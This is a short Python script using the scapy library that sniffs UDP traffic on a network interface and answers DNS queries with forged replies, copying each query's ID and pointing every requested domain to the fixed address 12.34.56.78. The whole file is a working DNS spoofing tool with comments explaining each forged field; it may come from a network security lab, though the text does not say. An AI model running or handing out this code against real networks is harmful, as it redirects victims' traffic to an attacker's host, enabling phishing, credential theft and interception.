from scapy.all import *
from scapy.all import send, sniff
from scapy.layers.inet import IP, UDP
from scapy.layers.dns import DNS, DNSRR, DNSQR


def spoof_packet(packet):
	if packet.haslayer(IP) and packet.haslayer(DNSQR):
		#swap the udp ports, and create a udp layer.
		udp_protocol_layer = UDP (sport = 53, dport = packet[UDP].sport)

		question_name = packet[DNSQR].qname #the domain name, the same like in the request.
		#the dns answer.
		resource_record = DNSRR(
		rrname = question_name, #the domain name, the same like in the request.
		rdata = "12.34.56.78") #the ip adress we want the packets to be directed to, isntead the original.
		 
		#create a dns layer.
		dns_protocol_layer = DNS (
		an = resource_record, #the answer.	
		qd = packet[DNS].qd, #the domain name, the same like in the request.	
		id = packet[DNS].id, #same id like in the request.
		ancount = 1, #the number of answers we will get.
		qr = 1, #because it's a response, and not a query.
		ra = 1, #recursion is allowed, cause we want to use the nslookup command.
		nscount = 0) #we want no namespace responses.

		#swap the ip adresses, and create an ip layer.
		ip_protocol_layer = IP (src = packet[IP].dst, dst = packet[IP].src)

		#assemble together, using the '/' scapy operator, and send the new packet. 
		send(ip_protocol_layer / udp_protocol_layer / dns_protocol_layer, iface = "enp0s9")

#sniff the packets (1000 packets), and call the spoof_packet function.	
sniff(count = 1000, filter = "udp", prn = spoof_packet, iface = "enp0s9")
